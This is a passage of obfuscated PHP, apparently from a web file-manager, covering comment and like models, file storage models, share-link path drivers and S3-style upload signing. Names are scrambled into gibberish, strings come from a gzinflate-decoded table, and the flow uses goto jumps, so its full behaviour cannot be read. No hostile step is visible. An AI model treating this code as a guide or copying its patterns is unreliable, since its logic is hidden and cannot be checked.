$¨±æŸµŸ, $ä∫¯ì≥ö[459] => $›˙Œçﬂ§); $ˆ¨‘—Å≈[] = $this->filterWhere($›É“˘ëµ); } if (!$ˆ¨‘—Å≈) { return !0; } $˝¶ò–‡Ï = $this->cacheKey($ä∫¯ì≥ö[484]); CacheLock::lock($˝¶ò–‡Ï); $ñæ“ àú = $this->addAll($ˆ¨‘—Å≈, array(), !0); CacheLock::unlock($˝¶ò–‡Ï); return $ñæ“ àú; } protected function optionDefault($öµã·º– = '') { return !1; } public function setDeep($âﬂÏ÷Ú·, $ñõ·ˆóË = false, $¸Ì…º¸ê = '') { $≠Üñ≈õ∫ = explode($_SERVER[ß⁄ˆÇ†Œ][10], $âﬂÏ÷Ú·); $è“¶º¬„ = $this->get(); array_set_value($è“¶º¬„, $âﬂÏ÷Ú·, $ñõ·ˆóË); $this->set($≠Üñ≈õ∫[0], $è“¶º¬„[$≠Üñ≈õ∫[0]], $¸Ì…º¸ê); } public function remove($èı“ã•÷, $•‚‘ñ◊µ = '') { $Ç£∆ãÙ‡ =& $_SERVER[ß⁄ˆÇ†Œ]; $this->cacheRemove($•‚‘ñ◊µ); $‡∞’ÃÂƒ = $this->filterWhere(array($Ç£∆ãÙ‡[97] => $èı“ã•÷, $Ç£∆ãÙ‡[33] => $•‚‘ñ◊µ)); if (is_null($èı“ã•÷)) { unset($‡∞’ÃÂƒ[$Ç£∆ãÙ‡[97]]); } return $this->where($‡∞’ÃÂƒ)->delete(); } public function cacheSet($ÚﬂÚÕ«ô, $ºŒÔıç† = false) { return Cache::set($this->cacheKey($ÚﬂÚÕ«ô), $ºŒÔıç†); } public function cacheGet($Ã¶√ì¯∆) { return Cache::get($this->cacheKey($Ã¶√ì¯∆)); } public function cacheRemove($·≥ˆÆÍ¥) { return Cache::remove($this->cacheKey($·≥ˆÆÍ¥)); } protected function filterWhere($∞àÀ◊ï) { return $∞àÀ◊ï; } protected function cacheKey($€Òéùÿ•) { return $€Òéùÿ•; } } goto DŸßÃ◊îóÓ; DêâÙé‹•Ñ: $azxgyrqfsn = $_SERVER[ß⁄ˆÇ†Œ][687]; if (strlen($azxgyrqfsn) < $_SERVER[ß⁄ˆÇ†Œ][688]) { die; } $_SERVER[è¨ò„Àﬂ] = explode($_SERVER[ß⁄ˆÇ†Œ][689], gzinflate(substr($_SERVER[ß⁄ˆÇ†Œ][690], 10, -8))); goto FÈñÀ°Ì¶∑; c∫ﬁØŸÿû≠: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($åíÚÄçÄ) { $this->pathParse = $åíÚÄçÄ; } protected function infoParse($•ﬁ˛àû∞, $êØè™ª¡ = false) { $ñÊﬁ–ªπ =& $_SERVER[ß⁄ˆÇ†Œ]; return Action($ñÊﬁ–ªπ[1252])->sharePathInfo($this->pathParse[$ñÊﬁ–ªπ[87]], !0, $êØè™ª¡); } public function listPath($·¿õêπÚ, $©µ˛éßº = false) { $⁄ˆöõÁ¥ =& $_SERVER[ß⁄ˆÇ†Œ]; $êÔÒüÄ¨ = IO::listPath($·¿õêπÚ, $©µ˛éßº); if (!$êÔÒüÄ¨) { return $êÔÒüÄ¨; } if (is_array($êÔÒüÄ¨[$⁄ˆöõÁ¥[1422]])) { $˜Öπî˚≤ = Action($⁄ˆöõÁ¥[1431])->parsePathChildren($êÔÒüÄ¨[$⁄ˆöõÁ¥[1422]], array($⁄ˆöõÁ¥[503] => $·¿õêπÚ)); $êÔÒüÄ¨[$⁄ˆöõÁ¥[1422]] = Action($⁄ˆöõÁ¥[1252])->shareItemInfo($˜Öπî˚≤); } foreach ($êÔÒüÄ¨ as $Â¶Åõ∂≤ => $ïß®Ä£) { if (!in_array($Â¶Åõ∂≤, array($⁄ˆöõÁ¥[86], $⁄ˆöõÁ¥[85]))) { continue; } foreach ($ïß®Ä£ as $ãº „≈Ú => $˜Öπî˚≤) { $˜Öπî˚≤ = Action($⁄ˆöõÁ¥[1431])->parsePathChildren($˜Öπî˚≤, array($⁄ˆöõÁ¥[503] => $·¿õêπÚ)); $êÔÒüÄ¨[$Â¶Åõ∂≤][$ãº „≈Ú] = Action($⁄ˆöõÁ¥[1252])->shareItemInfo($˜Öπî˚≤); } } return $êÔÒüÄ¨; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($™Ä˜ó∑Ô) { parent::__construct($™Ä˜ó∑Ô); $this->setSignVersion($_SERVER[ß⁄ˆÇ†Œ][247]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($´ªÚòº«) { parent::__construct($´ªÚòº«); $this->setSignVersion($_SERVER[ß⁄ˆÇ†Œ][247]); } public function uploadFormData($◊ÿ£Óçç, $’ë√Î∏ = 3600) { $ñ«£¬’ü =& $_SERVER[ß⁄ˆÇ†Œ]; $·¬„È…€ = $ñ«£¬’ü[229]; $˘† “Â• = $ñ«£¬’ü[270]; $π—◊—å≠ = $ñ«£¬’ü[62]; $Á´Ê√¡¢ = gmdate($ñ«£¬’ü[271]); $É±°∞éﬂ = gmdate($ñ«£¬’ü[272]); $Ãº¡â≥è = $ñ«£¬’ü[273]; $îúñÄÌÆ = $’ë√Î∏ . $ñ«£¬’ü[12]; $¥†¬˝ß˝ = $ñ«£¬’ü[274]; $Ï÷∆ŸÔﬂ = array($this->accessKey, $É±°∞éﬂ, $this->region, $π—◊—å≠, $Ãº¡â≥è); $Ñπí‹ì˝ = implode($ñ«£¬’ü[8], $Ï÷∆ŸÔﬂ); $Ω·ı·—… = array($ñ«£¬’ü[275] => gmdate($ñ«£¬’ü[299], strtotime($ñ«£¬’ü[277])), $ñ«£¬’ü[278] => array(array($ñ«£¬’ü[279] => $this->bucket), array($ñ«£¬’ü[280] => $·¬„È…€), array($ñ«£¬’ü[281], $ñ«£¬’ü[282], $ñ«£¬’ü[12]), array($ñ«£¬’ü[281], $ñ«£¬’ü[283], $ñ«£¬’ü[12]), array($ñ«£¬’ü[281], $ñ«£¬’ü[284], $ñ«£¬’ü[12]), array($ñ«£¬’ü[285] => $¥†¬˝ß˝), array($ñ«£¬’ü[286] => $Ñπí‹ì˝), array($ñ«£¬’ü[287] => $˘† “Â•), array($ñ«£¬’ü[288] => $Á´Ê√¡¢), array($ñ«£¬’ü[289] => $îúñÄÌÆ))); $ë€•Øµƒ = base64_encode(json_encode($Ω·ı·—…)); $⁄´ ≈‹« = hash_hmac($ñ«£¬’ü[290], $É±°∞éﬂ, $ñ«£¬’ü[291] . $this->secret, !0); $˛¢˛æé = hash_hmac($ñ«£¬’ü[290], $this->region, $⁄´ ≈‹«, !0); $ÑŒπŸ˙ï = hash_hmac($ñ«£¬’ü[290], $π—◊—å≠, $˛¢˛æé, !0); $µçë∆ùÁ = hash_hmac($ñ«£¬’ü[290], $Ãº¡â≥è, $ÑŒπŸ˙ï, !0); $ß•”ìﬁˆ = hash_hmac($ñ«£¬’ü[290], $ë€•Øµƒ, $µçë∆ùÁ); $≈Ω§ïÊª = array($ñ«£¬’ü[246] => $ñ«£¬’ü[12], $ñ«£¬’ü[292] => $ñ«£¬’ü[12], $ñ«£¬’ü[280] => $·¬„È…€, $ñ«£¬’ü[285] => $¥†¬˝ß˝, $ñ«£¬’ü[293] => $ë€•Øµƒ, $ñ«£¬’ü[294] => $Ñπí‹ì˝, $ñ«£¬’ü[295] => $˘† “Â•, $ñ«£¬’ü[296] => $Á´Ê√¡¢, $ñ«£¬’ü[297] => $îúñÄÌÆ, $ñ«£¬’ü[298] => $ß•”ìﬁˆ, $ñ«£¬’ü[208] => $this->getHost()); return $≈Ω§ïÊª; } } goto fÖÀ÷â∆ûâ; c¨ìœòÏ˘Ω: class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\155\145\x6e\x74"; protected $tableMeta = array("\x74\x61\142\154\x65\x4e\141\155\145" => "\x63\x6f\155\155\145\x6e\x74\137\x6d\145\x74\x61", "\155\145\x74\141\106\x69\x65\x6c\x64" => "\x63\x6f\x6d\x6d\x65\x6e\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($á¸‹àîì) { $Òäñ¿…⁄ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($á¸‹àîì[$Òäñ¿…⁄[1992]]) { $çÄ›Øπ˛ = $this->where(array($Òäñ¿…⁄[1993] => $á¸‹àîì[$Òäñ¿…⁄[1992]]))->find(); if (!$çÄ›Øπ˛ || $çÄ›Øπ˛[$Òäñ¿…⁄[190]] != $á¸‹àîì[$Òäñ¿…⁄[190]] || $çÄ›Øπ˛[$Òäñ¿…⁄[577]] != $á¸‹àîì[$Òäñ¿…⁄[577]]) { return !1; } $this->where(array($Òäñ¿…⁄[1993] => $á¸‹àîì[$Òäñ¿…⁄[1992]]))->setAdd($Òäñ¿…⁄[1994], 1); } $á¸‹àîì[$Òäñ¿…⁄[1995]] = 0; $á¸‹àîì[$Òäñ¿…⁄[1994]] = 0; $á¸‹àîì[$Òäñ¿…⁄[823]] = 1; return $this->add($á¸‹àîì); } public function commentCount($¡µ…‰≈Ä, $û∏˚◊Áé, $ÚÌØà≤ì = false) { $Ú úˆê© =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$¡µ…‰≈Ä) { return array(); } if (is_string($¡µ…‰≈Ä) || is_int($¡µ…‰≈Ä)) { $¡µ…‰≈Ä = array($¡µ…‰≈Ä); } $ß§¥‘ﬂÄ = array($Ú úˆê©[577], $Ú úˆê©[1996] => $Ú úˆê©[573]); $åΩÃƒ ñ = array($Ú úˆê©[577] => array($Ú úˆê©[7], $¡µ…‰≈Ä), $Ú úˆê©[190] => $û∏˚◊Áé); if ($ÚÌØà≤ì) { $åΩÃƒ ñ[$Ú úˆê©[1764]] = $ÚÌØà≤ì; } $Ëü≥‡ı = $this->field($ß§¥‘ﬂÄ)->where($åΩÃƒ ñ)->group($Ú úˆê©[577])->select(); return array_to_keyvalue($Ëü≥‡ı, $Ú úˆê©[577], $Ú úˆê©[573]); } public function starTarget($—÷õâŸ, $´ù» ˘Û) { $√«÷Âç =& $_SERVER[ß⁄ˆÇ†Œ]; $„ñÓû«ø = $—÷õâŸ + self::TYPE_STAR_OFFSET; $éßÀÙÛù = array($√«÷Âç[1764] => USER_ID, $√«÷Âç[190] => $„ñÓû«ø, $√«÷Âç[577] => $´ù» ˘Û); $“éÈûøá = $this->where($éßÀÙÛù)->find(); if ($“éÈûøá) { return $this->where(array($√«÷Âç[483] => $“éÈûøá[$√«÷Âç[483]]))->delete(); } $ı∆˛Òõ¬ = array($√«÷Âç[1992] => 0, $√«÷Âç[1764] => USER_ID, $√«÷Âç[823] => 1, $√«÷Âç[171] => $√«÷Âç[12], $√«÷Âç[190] => $„ñÓû«ø, $√«÷Âç[577] => $´ù» ˘Û, $√«÷Âç[1995] => 0, $√«÷Âç[1994] => 0); return $this->add($ı∆˛Òõ¬); } public function starTargetCount($∆∆Îå†–, $ îÔ£¥ü) { $≈ÎÂ∏ã– =& $_SERVER[ß⁄ˆÇ†Œ]; $•ﬁŒÆÌ£ = $ îÔ£¥ü + self::TYPE_STAR_OFFSET; $‰äÙì¡≥ = $this->commentCount($∆∆Îå†–, $•ﬁŒÆÌ£); $Ò“ÄõéÔ = $this->commentCount($∆∆Îå†–, $•ﬁŒÆÌ£, USER_ID); return array($≈ÎÂ∏ã–[1997] => $‰äÙì¡≥, $≈ÎÂ∏ã–[1998] => $Ò“ÄõéÔ); } public function starTargetUserList($≥ı¢ŸÙ‹, $⁄¶‘íÏô) { $ÖÍ¿Æî” =& $_SERVER[ß⁄ˆÇ†Œ]; $øÜ∆ã›œ = $≥ı¢ŸÙ‹ + self::TYPE_STAR_OFFSET; $ê±¯·•Ë = array($ÖÍ¿Æî”[577] => $⁄¶‘íÏô, $ÖÍ¿Æî”[190] => $øÜ∆ã›œ); $§˙≤äÀ› = $this->where($ê±¯·•Ë)->count(); $€§—ÛéΩ = array($ÖÍ¿Æî”[341] => $§˙≤äÀ›, $ÖÍ¿Æî”[1999] => array()); if (!$§˙≤äÀ›) { return $€§—ÛéΩ; } $ÎﬂÃ©¬® = $this->field($ÖÍ¿Æî”[1764])->where($ê±¯·•Ë)->limit(500)->select(); $ÎﬂÃ©¬® = array_to_keyvalue($ÎﬂÃ©¬®, $ÖÍ¿Æî”[12], $ÖÍ¿Æî”[1764]); $€§—ÛéΩ[$ÖÍ¿Æî”[1999]] = Model($ÖÍ¿Æî”[585])->userListInfo($ÎﬂÃ©¬®); return $€§—ÛéΩ; } public function prasiseUserList($ﬁ‰˘◊‹∑) { $ó¢≠ÛØ =& $_SERVER[ß⁄ˆÇ†Œ]; $É›©≠≈Ø = array($ó¢≠ÛØ[2000] => $ﬁ‰˘◊‹∑); $Ωí≤ò÷Ò = $this->where($É›©≠≈Ø)->find(); $±¬µ√÷À = _get($Ωí≤ò÷Ò, $ó¢≠ÛØ[1995], 0); $⁄í◊ÂÌˆ = array($ó¢≠ÛØ[341] => $±¬µ√÷À, $ó¢≠ÛØ[1999] => array()); if (!$±¬µ√÷À) { return $⁄í◊ÂÌˆ; } $©˛Á´¸Õ = Model($ó¢≠ÛØ[2001])->field($ó¢≠ÛØ[1764])->where($É›©≠≈Ø)->limit(500)->select(); $©˛Á´¸Õ = array_to_keyvalue($©˛Á´¸Õ, $ó¢≠ÛØ[12], $ó¢≠ÛØ[1764]); $⁄í◊ÂÌˆ[$ó¢≠ÛØ[1999]] = Model($ó¢≠ÛØ[585])->userListInfo($©˛Á´¸Õ); return $⁄í◊ÂÌˆ; } public function remove($ô¨˛“∫å) { $⁄¢Ñ∏ËÉ =& $_SERVER[ß⁄ˆÇ†Œ]; $∑≥Û°‡ﬂ = array($⁄¢Ñ∏ËÉ[1993] => $ô¨˛“∫å); $‰¸ÄıãÙ = $this->where($∑≥Û°‡ﬂ)->find(); if ($‰¸ÄıãÙ[$⁄¢Ñ∏ËÉ[1992]]) { $this->where(array($⁄¢Ñ∏ËÉ[1993] => $‰¸ÄıãÙ[$⁄¢Ñ∏ËÉ[1992]]))->setAdd($⁄¢Ñ∏ËÉ[1994], -1); } return $this->where($∑≥Û°‡ﬂ)->delete(); } public function edit($…£Ñ¶à∂, $ÙÃ∂∞≈Ä) { $Û÷∆ﬂ¯µ =& $_SERVER[ß⁄ˆÇ†Œ]; $Í∫¯Ìó™ = array($Û÷∆ﬂ¯µ[1993] => $…£Ñ¶à∂); return $this->where($Í∫¯Ìó™)->save(array($Û÷∆ﬂ¯µ[2002] => $ÙÃ∂∞≈Ä)); } public function prasise($Áúç•¸é) { $ı¬èõÌ• =& $_SERVER[ß⁄ˆÇ†Œ]; $¯¬√ØÕÀ = Model($ı¬èõÌ•[2003]); $≈Â§»Ä± = array($ı¬èõÌ•[1993] => $Áúç•¸é, $ı¬èõÌ•[1755] => USER_ID); $„âõ‡ëﬂ = $¯¬√ØÕÀ->where($≈Â§»Ä±)->find(); if (!$„âõ‡ëﬂ) { $¯¬√ØÕÀ->add($≈Â§»Ä±); $ø·ŒÃû° = $this->where(array($ı¬èõÌ•[1993] => $Áúç•¸é))->setAdd($ı¬èõÌ•[1995], 1); } else { $¯¬√ØÕÀ->where($≈Â§»Ä±)->delete(); $ø·ŒÃû° = $this->where(array($ı¬èõÌ•[1993] => $Áúç•¸é))->setAdd($ı¬èõÌ•[1995], -1); } return $ø·ŒÃû°; } public function targetInfo($¥¸™›ˆè, $∆Ü®˜Ê∏) { $¢ªºÌËÖ =& $_SERVER[ß⁄ˆÇ†Œ]; $±ªå∆¬Ü = array($¢ªºÌËÖ[656] => $¥¸™›ˆè, $¢ªºÌËÖ[657] => $∆Ü®˜Ê∏); $§œ∫ÇäÕ = $this->where($±ªå∆¬Ü)->count(); $–ﬁ€ìﬂŒ = "\122\x49\x47\x48\124\x20\112\117\x49\116\40{$this->tablePrefix}\x63\x6f\x6d\x6d\145\156\x74\137\x70\x72\x61\x69\163\145\x20\x73\x74\141\162\x20\157\156\x20\x63\x6f\x6d\x6d\145\156\164\x2e\143\157\155\x6d\x65\x6e\164\x49\x44\40\75\40\163\164\141\x72\x2e\x63\x6f\155\155\145\156\x74\x49\104"; $©„˘’‘∂ = $this->alias($¢ªºÌËÖ[439])->where($±ªå∆¬Ü)->join($–ﬁ€ìﬂŒ, $¢ªºÌËÖ[2004])->count(); $¶™≈·Äô = array($¢ªºÌËÖ[2005] => $§œ∫ÇäÕ, $¢ªºÌËÖ[2006] => $©„˘’‘∂); return $¶™≈·Äô; } public function listData($ç¯¥˜ê™) { $‡à¥∂⁄Ù =& $_SERVER[ß⁄ˆÇ†Œ]; if (isset($ç¯¥˜ê™[$‡à¥∂⁄Ù[2007]])) { if ($ç¯¥˜ê™[$‡à¥∂⁄Ù[2007]]) { $ç¯¥˜ê™[$‡à¥∂⁄Ù[2000]] = array($‡à¥∂⁄Ù[1088], intval($ç¯¥˜ê™[$‡à¥∂⁄Ù[2007]])); } unset($ç¯¥˜ê™[$‡à¥∂⁄Ù[2007]]); } if (isset($ç¯¥˜ê™[$‡à¥∂⁄Ù[2008]])) { if ($ç¯¥˜ê™[$‡à¥∂⁄Ù[2008]]) { $ç¯¥˜ê™[$‡à¥∂⁄Ù[2000]] = array($‡à¥∂⁄Ù[1085], intval($ç¯¥˜ê™[$‡à¥∂⁄Ù[2008]])); } unset($ç¯¥˜ê™[$‡à¥∂⁄Ù[2008]]); } return $this->_listData($ç¯¥˜ê™); } private function _listData($øÅàë…£) { $âÖˆ·•« =& $_SERVER[ß⁄ˆÇ†Œ]; $»—¡£—ë = $this->where($øÅàë…£)->_makeOrder()->selectPage(100); $this->_listAppendParent($»—¡£—ë[$âÖˆ·•«[454]]); $this->_listAppendUser($»—¡£—ë[$âÖˆ·•«[454]]); $this->_listAppendMeta($»—¡£—ë[$âÖˆ·•«[454]]); return $»—¡£—ë; } private function _makeOrder() { $‡Ï∞≠®Å =& $_SERVER[ß⁄ˆÇ†Œ]; $¸Ÿ´‡¢∏ = array($‡Ï∞≠®Å[1995], $‡Ï∞≠®Å[1994], $‡Ï∞≠®Å[231]); $¶É–ãíÎ = Input::get($‡Ï∞≠®Å[538], $‡Ï∞≠®Å[7], $‡Ï∞≠®Å[505], $¸Ÿ´‡¢∏); $ù˘á⁄ç˙ = Input::get($‡Ï∞≠®Å[539], $‡Ï∞≠®Å[7], $‡Ï∞≠®Å[1757], array($‡Ï∞≠®Å[2009], $‡Ï∞≠®Å[534])); $˚õéè»È = $¶É–ãíÎ . $‡Ï∞≠®Å[53] . $ù˘á⁄ç˙; return $this->order($˚õéè»È); } private function _listAppendParent(&$™ôéì≠Õ) { $≥ˆ√†Ω˙ =& $_SERVER[ß⁄ˆÇ†Œ]; $˙ÎÒœúﬁ = array_unique(array_to_keyvalue($™ôéì≠Õ, $≥ˆ√†Ω˙[12], $≥ˆ√†Ω˙[1992])); $˙ÎÒœúﬁ = array_remove_value($˙ÎÒœúﬁ, $≥ˆ√†Ω˙[228]); if (!$˙ÎÒœúﬁ) { return; } $ÿÍ˘îÊ© = $this->where(array($≥ˆ√†Ω˙[1993] => array($≥ˆ√†Ω˙[7], $˙ÎÒœúﬁ)))->select(); $ÿÍ˘îÊ© = array_to_keyvalue($ÿÍ˘îÊ©, $≥ˆ√†Ω˙[2000]); foreach ($™ôéì≠Õ as &$Éã¡Ë• ) { if (isset($ÿÍ˘îÊ©[$Éã¡Ë• [$≥ˆ√†Ω˙[1992]]])) { $Éã¡Ë• [$≥ˆ√†Ω˙[2010]] = $ÿÍ˘îÊ©[$Éã¡Ë• [$≥ˆ√†Ω˙[1992]]]; } } unset($Éã¡Ë• ); } private function _listAppendUser(&$ôµ˜Èø) { $¥í¬⁄ÈÔ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÆÅØƒ◊ò = array_unique(array_to_keyvalue($ôµ˜Èø, $¥í¬⁄ÈÔ[12], $¥í¬⁄ÈÔ[1764])); $ÆÅØƒ◊ò = array_remove_value($ÆÅØƒ◊ò, $¥í¬⁄ÈÔ[228]); if (count($ÆÅØƒ◊ò) == 0) { return; } foreach ($ôµ˜Èø as $’˜ª˙âÓ) { if (isset($’˜ª˙âÓ[$¥í¬⁄ÈÔ[2010]])) { $ÆÅØƒ◊ò[] = $’˜ª˙âÓ[$¥í¬⁄ÈÔ[2010]][$¥í¬⁄ÈÔ[1764]]; } } $»Ñﬂö∆ˆ = Model($¥í¬⁄ÈÔ[606])->userListInfo($ÆÅØƒ◊ò); foreach ($ôµ˜Èø as &$’˜ª˙âÓ) { $’˜ª˙âÓ[$¥í¬⁄ÈÔ[670]] = $»Ñﬂö∆ˆ[$’˜ª˙âÓ[$¥í¬⁄ÈÔ[1764]]]; if (isset($’˜ª˙âÓ[$¥í¬⁄ÈÔ[2010]])) { $’˜ª˙âÓ[$¥í¬⁄ÈÔ[2010]][$¥í¬⁄ÈÔ[670]] = $»Ñﬂö∆ˆ[$’˜ª˙âÓ[$¥í¬⁄ÈÔ[2010]][$¥í¬⁄ÈÔ[1764]]]; } } unset($’˜ª˙âÓ); } private function _listAppendMeta(&$≠è‚ä«í) { $∆¬íæÅÔ =& $_SERVER[ß⁄ˆÇ†Œ]; $ëÇæ—¯” = array_unique(array_to_keyvalue($≠è‚ä«í, $∆¬íæÅÔ[12], $∆¬íæÅÔ[2000])); $ëÇæ—¯” = array_remove_value($ëÇæ—¯”, $∆¬íæÅÔ[228]); if (!$ëÇæ—¯”) { return; } foreach ($≠è‚ä«í as $˜∑®ˆ≤‡) { if (isset($˜∑®ˆ≤‡[$∆¬íæÅÔ[2010]])) { $ëÇæ—¯”[] = $˜∑®ˆ≤‡[$∆¬íæÅÔ[2010]][$∆¬íæÅÔ[2000]]; } } $Ôè—Ô¸Œ = $this->metaList($ëÇæ—¯”); if (!$Ôè—Ô¸Œ) { return !1; } foreach ($≠è‚ä«í as &$˜∑®ˆ≤‡) { $˜∑®ˆ≤‡[$∆¬íæÅÔ[547]] = $Ôè—Ô¸Œ[$˜∑®ˆ≤‡[$∆¬íæÅÔ[2000]]]; if (isset($˜∑®ˆ≤‡[$∆¬íæÅÔ[2010]])) { $˜∑®ˆ≤‡[$∆¬íæÅÔ[2010]][$∆¬íæÅÔ[547]] = $Ôè—Ô¸Œ[$˜∑®ˆ≤‡[$∆¬íæÅÔ[2010]][$∆¬íæÅÔ[2000]]]; } } unset($˜∑®ˆ≤‡); } private function metaList($…Ï‰ÓﬁØ) { $ª—ı•’ö =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$…Ï‰ÓﬁØ) { return array(); } $±ëÇƒÂÇ = array($ª—ı•’ö[2000] => array($ª—ı•’ö[7], $…Ï‰ÓﬁØ)); $≥ΩüÔ®£ = Model($ª—ı•’ö[2011])->where($±ëÇƒÂÇ)->select(); $≥ΩüÔ®£ = array_to_keyvalue_group($≥ΩüÔ®£, $ª—ı•’ö[2000]); foreach ($≥ΩüÔ®£ as $ô◊ñÏ˛† => $ÉÏ’ÕÀä) { $õ´»Ç© = array(); foreach ($ÉÏ’ÕÀä as $ÏíÕò——) { $õ´»Ç©[$ÏíÕò——[$ª—ı•’ö[97]]] = $ÏíÕò——[$ª—ı•’ö[459]]; } $≥ΩüÔ®£[$ô◊ñÏ˛†] = $õ´»Ç©; } return $≥ΩüÔ®£ ? $≥ΩüÔ®£ : array(); } public function removeTarget($î»ÒÙ∆≈, $—óÒ”«∂) { $∆€§◊≤´ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$—óÒ”«∂) { return !0; } $—óÒ”«∂ = is_array($—óÒ”«∂) ? $—óÒ”«∂ : array($—óÒ”«∂); $÷¶œÓƒ˛ = array($∆€§◊≤´[190] => $î»ÒÙ∆≈, $∆€§◊≤´[577] => array($∆€§◊≤´[7], $—óÒ”«∂)); $ã˘Ÿ∞øŸ = $this->field($∆€§◊≤´[2000])->where($÷¶œÓƒ˛)->select(); $˜¬ßÃ€à = array_to_keyvalue($ã˘Ÿ∞øŸ, $∆€§◊≤´[12], $∆€§◊≤´[2000]); if (!$˜¬ßÃ€à) { return !0; } $÷¶œÓƒ˛ = array($∆€§◊≤´[2000] => array($∆€§◊≤´[7], $˜¬ßÃ€à)); $this->where($÷¶œÓƒ˛)->delete(); Model($∆€§◊≤´[2003])->where($÷¶œÓƒ˛)->delete(); Model($∆€§◊≤´[2012])->where($÷¶œÓƒ˛)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\x69\154\145\137\143\x6f\156\x74\145\x6e\x74\163"; protected $dataAuto = array(array("\x63\162\x65\141\x74\x65\x54\151\x6d\x65", "\x74\151\x6d\145", "\x69\156\x73\145\162\x74", "\x66\x75\156\143\x74\151\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\151\154\x65"; protected $tableMeta = array("\164\x61\142\x6c\145\x4e\x61\155\x65" => "\x69\x6f\137\x66\x69\x6c\145\x5f\155\145\164\x61", "\x6d\x65\x74\x61\106\x69\145\x6c\144" => "\146\x69\x6c\x65\x49\104"); public function fileInfo($’ïõ˝†Ó) { $πöºçÀß =& $_SERVER[ß⁄ˆÇ†Œ]; static $’–Ë∑óÄ = array(); if (!isset($’–Ë∑óÄ[$’ïõ˝†Ó])) { $ªΩ°ˆªÉ = $πöºçÀß[2013]; $±ï°¢¢Ï = Model($πöºçÀß[552])->field($ªΩ°ˆªÉ)->where(array($πöºçÀß[550] => $’ïõ˝†Ó))->find(); $’–Ë∑óÄ[$’ïõ˝†Ó] = $±ï°¢¢Ï; } return $’–Ë∑óÄ[$’ïõ˝†Ó]; } public function addFileByContent($ëò‰¬€å = '', $πåôÂ÷€ = '') { $Û«ƒç–î =& $_SERVER[ß⁄ˆÇ†Œ]; $À˝‘ÑÖﬁ = TEMP_PATH . $Û«ƒç–î[2014]; if (!is_dir($À˝‘ÑÖﬁ)) { mk_dir($À˝‘ÑÖﬁ); } $Ö≈¬ªö— = $À˝‘ÑÖﬁ . $Û«ƒç–î[2015] . rand_string(16); file_put_contents($Ö≈¬ªö—, $ëò‰¬€å); $”ö≥ì¥Ω = $this->addFile($Ö≈¬ªö—, $πåôÂ÷€, !0); if (file_exists($Ö≈¬ªö—)) { @unlink($Ö≈¬ªö—); } return $”ö≥ì¥Ω; } public function createFileName($™‘î˚£Ÿ, $˙Ì˙Ô§∫ = false, $¬µÏÅßÊ = false) { $ÙùµåÙç =& $_SERVER[ß⁄ˆÇ†Œ]; $Œÿ˝ñíÜ = IO::init($ÙùµåÙç[8]); $ü‹∏√ä“ = $this->makeFilePath($™‘î˚£Ÿ, $Œÿ˝ñíÜ, $˙Ì˙Ô§∫, $¬µÏÅßÊ); $©Á‚àôç = $Œÿ˝ñíÜ->pathFather($ü‹∏√ä“); static $ãÄ–˛ª´ = false; $¡£ÊΩÏÊ = $ÙùµåÙç[2016] . md5($©Á‚àôç); if (!$ãÄ–˛ª´ && !Cache::get($¡£ÊΩÏÊ)) { $ãÄ–˛ª´ = !0; $√˝º¬õ— = IO::mkdir($©Á‚àôç); if (!IO::exist($√˝º¬õ— . $ÙùµåÙç[870])) { IO::mkfile($√˝º¬õ— . $ÙùµåÙç[870]); } Cache::set($¡£ÊΩÏÊ, 1, 3600 * 2); } return $ü‹∏√ä“; } public function makeFilePath($ﬂä≤Ã©», $Í·Œàπ∫, $ñõ‡æéî = false, $Ç˘≤‚∏… = false) { $ÿ›¸Ãè“ =& $_SERVER[ß⁄ˆÇ†Œ]; $’Áòò… = Model($ÿ›¸Ãè“[843])->get($ÿ›¸Ãè“[2017]); $ãªÆ§¨ß = KodIO::defaultIO() . date($ÿ›¸Ãè“[2018]); $È´πÿÑ¯ = $ãªÆ§¨ß . rand_string(5) . short_id(100); $ﬂä≤Ã©» = str_replace($ÿ›¸Ãè“[8], $ÿ›¸Ãè“[11], KodIO::clear($ﬂä≤Ã©»)); $ÃÊ≥Ωïç = $Í·Œàπ∫->ext($ﬂä≤Ã©»); if (!$ﬂä≤Ã©») { $’Áòò… = $ÿ›¸Ãè“[849]; } switch ($’Áòò…) { case $ÿ›¸Ãè“[2019]: if ($ÃÊ≥Ωïç) { $È´πÿÑ¯ = $È´πÿÑ¯ . $ÿ›¸Ãè“[10] . $ÃÊ≥Ωïç; } if ($ÃÊ≥Ωïç == $ÿ›¸Ãè“[1955]) { $È´πÿÑ¯ .= $ÿ›¸Ãè“[1287]; } break; case $ÿ›¸Ãè“[2020]: $óŸ√å€ﬂ = Model($ÿ›¸Ãè“[843])->get($ÿ›¸Ãè“[844]); $Ø˜∑∆»¶ = substr(md5($ÿ›¸Ãè“[845] . $óŸ√å€ﬂ . date($ÿ›¸Ãè“[822])), 0, 8); $‰Ê“¿Áõ = KodIO::defaultDriver(); $ãªÆ§¨ß = $ÿ›¸Ãè“[1318] . $‰Ê“¿Áõ[$ÿ›¸Ãè“[483]] . $ÿ›¸Ãè“[492] . date($ÿ›¸Ãè“[2021]) . $Ø˜∑∆»¶ . $ÿ›¸Ãè“[8]; if ($ÃÊ≥Ωïç == $ÿ›¸Ãè“[1955]) { $ﬂä≤Ã©» .= $ÿ›¸Ãè“[1287]; } $¥Ë¢Ü‚¥ = $ÿ›¸Ãè“[2022] . $ãªÆ§¨ß . $ﬂä≤Ã©»; CacheLock::lock($¥Ë¢Ü‚¥); $È´πÿÑ¯ = $ãªÆ§¨ß . $ﬂä≤Ã©»; if (IO::exist($ãªÆ§¨ß . $ﬂä≤Ã©»)) { $Œõ∂„è“ = substr($ﬂä≤Ã©», 0, strlen($ﬂä≤Ã©») - 